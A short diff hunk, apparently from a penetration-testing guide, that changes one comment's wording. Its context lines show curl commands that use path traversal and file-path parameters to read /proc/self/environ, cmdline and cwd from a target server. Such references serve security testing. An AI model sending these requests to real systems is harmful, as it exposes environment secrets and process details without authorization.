@@ -190,7 +190,7 @@ curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/file?path=/proc/
 curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/read?file=../../../../proc/self/environ"
 
 # Also check:
-curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/file?path=/proc/self/cmdline"  # full command line
+curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/file?path=/proc/self/cmdline"  # full command-line
 curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/file?path=/proc/self/cwd"       # working directory
 ```
 
